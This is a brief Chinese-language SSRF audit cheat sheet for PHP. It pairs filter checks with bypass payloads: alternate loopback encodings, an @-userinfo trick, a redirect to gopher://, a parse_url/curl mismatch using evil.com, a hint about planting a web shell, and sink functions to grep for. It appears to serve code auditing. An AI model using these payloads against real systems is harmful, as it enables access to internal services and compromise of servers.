# SSRF 绕过审计

## 关键字过滤
```php
preg_match('/127\.0\.0\.1|localhost/i', $url)
```
绕过: `http://0/` `http://[::1]/` `http://2130706433/` `http://0x7f000001/` `http://127.1/` `http://127.0.0.1.xip.io/`

## @ 绕过（只检查开头）
```php
if(strpos($url, 'http://127.6.6.1/') === 0)
```
绕过: `http://127.6.6.1@内网IP:port/`

## 协议限制
```php
if (!in_array($scheme, ['http','https']))
```
绕过: 302跳转到 gopher://

## 后缀限制
绕过: 找可回显的图片页 URL 写入木马

## URL 解析差异
```
parse_url("http://127.0.0.1:80\@evil.com/") → evil.com
curl 实际请求 → 127.0.0.1
```

## 审计搜索
```
file_get_contents($_GET['url'])
curl_exec($ch)
fsockopen($host, $port)
```
